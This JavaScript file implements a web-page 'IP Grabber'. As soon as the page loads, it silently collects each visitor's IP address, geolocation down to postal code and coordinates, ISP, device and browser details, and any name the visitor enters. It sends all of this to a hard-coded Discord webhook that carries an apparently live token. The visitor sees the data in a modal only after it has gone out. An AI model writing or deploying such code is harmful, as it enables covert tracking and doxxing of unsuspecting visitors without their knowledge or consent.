// Discord Webhook URL - Replace with your actual webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1416742887722320062/-5WaLqKF3w21CGDp_q24eKtV8KXdP5e2_6ES2GAB8nyacoq_pn_cSj8kh98KXer1owjf';

// Global variable to store user information
let currentUserInfo = null;

// Simple test function to open modal (for debugging)
function testModal() {
    console.log('Test modal function called');
    
    // Capture the name from input field
    const nameInput = document.getElementById('nameInput');
    const enteredName = nameInput ? nameInput.value.trim() : '';
    
    console.log('Entered name:', enteredName);
    
    const modal = document.getElementById('detailsModal');
    const loading = document.getElementById('loading');
    const userDetails = document.getElementById('userDetails');
    
    if (modal) {
        modal.style.display = 'block';
        loading.style.display = 'block';
        userDetails.style.display = 'none';
        console.log('Modal opened via test function');
        
        // If we have user info, show it after a delay
        if (currentUserInfo) {
            console.log('Using cached user info');
            // Update the cached info with the new name
            currentUserInfo.enteredName = enteredName;
            setTimeout(() => {
                displayUserInfo();
            }, 1500);
        } else {
            console.log('Grabbing user info...');
            grabUserInfo(enteredName).then(() => {
                setTimeout(() => {
                    displayUserInfo();
                }, 2000);
            });
        }
    } else {
        console.error('Modal not found in test function');
    }
}

// Function to get user's IP and device information
async function grabUserInfo(enteredName = '') {
    try {
        // Get IP information from multiple sources for reliability
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Get detailed location and ISP info
        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const detailsData = await detailsResponse.json();
        
        // Get browser and device information
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const cookieEnabled = navigator.cookieEnabled;
        const javaEnabled = navigator.javaEnabled();
        
        // Get screen information
        const screenWidth = screen.width;
        const screenHeight = screen.height;
        const screenColorDepth = screen.colorDepth;
        
        // Get timezone
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // Get current timestamp
        const timestamp = new Date().toISOString();
        
        // Compile all information
        const userInfo = {
            ip: ipData.ip,
            city: detailsData.city || 'Unknown',
            region: detailsData.region || 'Unknown',
            country: detailsData.country_name || 'Unknown',
            countryCode: detailsData.country_code || 'Unknown',
            isp: detailsData.org || 'Unknown',
            latitude: detailsData.latitude || 'Unknown',
            longitude: detailsData.longitude || 'Unknown',
            postal: detailsData.postal || 'Unknown',
            userAgent: userAgent,
            platform: platform,
            language: language,
            cookieEnabled: cookieEnabled,
            javaEnabled: javaEnabled,
            screenWidth: screenWidth,
            screenHeight: screenHeight,
            screenColorDepth: screenColorDepth,
            timezone: timezone,
            timestamp: timestamp,
            referrer: document.referrer || 'Direct visit',
            enteredName: enteredName || 'Not provided'
        };
        
        // Store user info globally for modal display
        currentUserInfo = userInfo;
        
        // Send to Discord webhook
        await sendToDiscord(userInfo);
        
        // Send name separately if provided
        if (enteredName && enteredName.trim() !== '') {
            await sendNameToDiscord(enteredName, userInfo.ip);
        }
        
        return userInfo;
    } catch (error) {
        console.error('Error grabbing user info:', error);
        // Send error notification to Discord
        await sendErrorToDiscord(error);
    }
}

// Function to send user info to Discord webhook
async function sendToDiscord(userInfo) {
    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
        console.log('Please replace DISCORD_WEBHOOK with your actual webhook URL');
        console.log('User info that would be sent:', userInfo);
        return;
    }
    
    const embed = {
        title: userInfo.enteredName !== 'Not provided' ? `🎯 New Visitor: ${userInfo.enteredName}` : "🎯 New Visitor Detected",
        color: 0xFF0000, // Red color
        timestamp: userInfo.timestamp,
        fields: [
            {
                name: "👤 Visitor Information",
                value: `**Name:** ${userInfo.enteredName}\n**Visit Time:** ${new Date(userInfo.timestamp).toLocaleString()}`,
                inline: false
            },
            {
                name: "🌐 Network Information",
                value: `**IP Address:** ${userInfo.ip}\n**ISP:** ${userInfo.isp}`,
                inline: false
            },
            {
                name: "📍 Location",
                value: `**Country:** ${userInfo.country} (${userInfo.countryCode})\n**Region:** ${userInfo.region}\n**City:** ${userInfo.city}\n**Postal:** ${userInfo.postal}\n**Coordinates:** ${userInfo.latitude}, ${userInfo.longitude}`,
                inline: false
            },
            {
                name: "💻 Device Information",
                value: `**Platform:** ${userInfo.platform}\n**Screen:** ${userInfo.screenWidth}x${userInfo.screenHeight} (${userInfo.screenColorDepth}-bit)\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}`,
                inline: false
            },
            {
                name: "🌐 Browser Information",
                value: `**User Agent:** ${userInfo.userAgent}\n**Cookies:** ${userInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Java:** ${userInfo.javaEnabled ? 'Enabled' : 'Disabled'}\n**Referrer:** ${userInfo.referrer}`,
                inline: false
            }
        ],
        footer: {
            text: "IP Grabber • Visitor Tracking System"
        }
    };
    
    const payload = {
        embeds: [embed]
    };
    
    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            throw new Error(`Discord webhook failed: ${response.status}`);
        }
        
        console.log('Successfully sent user info to Discord');
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// Function to send error notifications to Discord
async function sendErrorToDiscord(error) {
    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
        return;
    }
    
    const embed = {
        title: "⚠️ Error in IP Grabber",
        color: 0xFFFF00, // Yellow color
        description: `An error occurred while trying to grab user information:\n\`\`\`${error.message}\`\`\``,
        timestamp: new Date().toISOString(),
        footer: {
            text: "IP Grabber Error Log"
        }
    };
    
    const payload = {
        embeds: [embed]
    };
    
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch (webhookError) {
        console.error('Error sending error to Discord:', webhookError);
    }
}

// Function to send name separately to Discord
async function sendNameToDiscord(name, ip) {
    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
        console.log('Name that would be sent separately:', name);
        return;
    }
    
    const embed = {
        title: "📝 Name Entered",
        color: 0x00FF00, // Green color
        description: `**${name}** just entered their name on the site`,
        fields: [
            {
                name: "Details",
                value: `**Name:** ${name}\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}`,
                inline: false
            }
        ],
        footer: {
            text: "Name Capture • IP Grabber"
        },
        timestamp: new Date().toISOString()
    };
    
    const payload = {
        embeds: [embed]
    };
    
    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            throw new Error(`Discord name webhook failed: ${response.status}`);
        }
        
        console.log('Successfully sent name to Discord');
    } catch (error) {
        console.error('Error sending name to Discord:', error);
    }
}

// Modal functionality
function initializeModal() {
    console.log('Initializing modal...');
    
    const modal = document.getElementById('detailsModal');
    const btn = document.getElementById('showDetailsBtn');
    const closeBtn = document.querySelector('.close');
    const loading = document.getElementById('loading');
    const userDetails = document.getElementById('userDetails');

    console.log('Modal elements found:', {
        modal: !!modal,
        btn: !!btn,
        closeBtn: !!closeBtn,
        loading: !!loading,
        userDetails: !!userDetails
    });

    if (!modal || !btn || !closeBtn || !loading || !userDetails) {
        console.error('Some modal elements not found!');
        return;
    }

    // Show modal when button is clicked
    btn.addEventListener('click', function(e) {
        console.log('Button clicked!');
        e.preventDefault();
        
        modal.style.display = 'block';
        loading.style.display = 'block';
        userDetails.style.display = 'none';
        
        console.log('Modal should be visible now');
        
        // If we don't have user info yet, grab it
        if (!currentUserInfo) {
            console.log('Grabbing user info...');
            grabUserInfo().then(() => {
                setTimeout(() => {
                    displayUserInfo();
                }, 2000); // Show loading for 2 seconds for effect
            });
        } else {
            console.log('Using cached user info');
            // If we already have info, show it after a brief loading
            setTimeout(() => {
                displayUserInfo();
            }, 1500);
        }
    });

    // Close modal when X is clicked
    closeBtn.addEventListener('click', function(e) {
        console.log('Close button clicked');
        e.preventDefault();
        modal.style.display = 'none';
    });

    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        if (event.target === modal) {
            console.log('Clicked outside modal, closing');
            modal.style.display = 'none';
        }
    });
    
    // Add a simple test click handler as backup
    btn.onclick = function(e) {
        console.log('Backup onclick handler triggered');
        if (modal.style.display !== 'block') {
            modal.style.display = 'block';
            loading.style.display = 'block';
            userDetails.style.display = 'none';
        }
    };
    
    console.log('Modal initialization complete');
}

function displayUserInfo() {
    const loading = document.getElementById('loading');
    const userDetails = document.getElementById('userDetails');
    
    if (!currentUserInfo) {
        userDetails.innerHTML = '<p style="text-align: center; color: #666;">Unable to gather information. Please try again.</p>';
    } else {
        userDetails.innerHTML = `
            <div class="detail-group">
                <h3>👤 Your Information</h3>
                <div class="detail-item">
                    <span class="detail-label">Name:</span>
                    <span class="detail-value">${currentUserInfo.enteredName}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Visit Time:</span>
                    <span class="detail-value">${new Date(currentUserInfo.timestamp).toLocaleString()}</span>
                </div>
            </div>
            
            <div class="detail-group">
                <h3>🌐 Network Information</h3>
                <div class="detail-item">
                    <span class="detail-label">IP Address:</span>
                    <span class="detail-value">${currentUserInfo.ip}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">ISP Provider:</span>
                    <span class="detail-value">${currentUserInfo.isp}</span>
                </div>
            </div>
            
            <div class="detail-group">
                <h3>📍 Location Details</h3>
                <div class="detail-item">
                    <span class="detail-label">Country:</span>
                    <span class="detail-value">${currentUserInfo.country} (${currentUserInfo.countryCode})</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Region:</span>
                    <span class="detail-value">${currentUserInfo.region}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">City:</span>
                    <span class="detail-value">${currentUserInfo.city}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Postal Code:</span>
                    <span class="detail-value">${currentUserInfo.postal}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Coordinates:</span>
                    <span class="detail-value">${currentUserInfo.latitude}, ${currentUserInfo.longitude}</span>
                </div>
            </div>
            
            <div class="detail-group">
                <h3>💻 Device Information</h3>
                <div class="detail-item">
                    <span class="detail-label">Platform:</span>
                    <span class="detail-value">${currentUserInfo.platform}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Screen Resolution:</span>
                    <span class="detail-value">${currentUserInfo.screenWidth} x ${currentUserInfo.screenHeight}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Color Depth:</span>
                    <span class="detail-value">${currentUserInfo.screenColorDepth}-bit</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Language:</span>
                    <span class="detail-value">${currentUserInfo.language}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Timezone:</span>
                    <span class="detail-value">${currentUserInfo.timezone}</span>
                </div>
            </div>
            
            <div class="detail-group">
                <h3>🌐 Browser Information</h3>
                <div class="detail-item">
                    <span class="detail-label">User Agent:</span>
                    <span class="detail-value">${currentUserInfo.userAgent}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Cookies Enabled:</span>
                    <span class="detail-value">${currentUserInfo.cookieEnabled ? 'Yes' : 'No'}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Java Enabled:</span>
                    <span class="detail-value">${currentUserInfo.javaEnabled ? 'Yes' : 'No'}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Referrer:</span>
                    <span class="detail-value">${currentUserInfo.referrer}</span>
                </div>
            </div>
        `;
    }
    
    loading.style.display = 'none';
    userDetails.style.display = 'block';
}

// Automatically grab user info when the page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log('IP Grabber loaded successfully');
    
    // Add a small delay to ensure all elements are loaded
    setTimeout(() => {
        // Initialize modal functionality
        initializeModal();
        
        // Grab user info silently in background
        grabUserInfo();
    }, 500);
});

// Backup initialization in case DOMContentLoaded already fired
if (document.readyState === 'loading') {
    // Document is still loading
} else {
    // Document has finished loading
    setTimeout(() => {
        initializeModal();
        if (!currentUserInfo) {
            grabUserInfo();
        }
    }, 100);
}
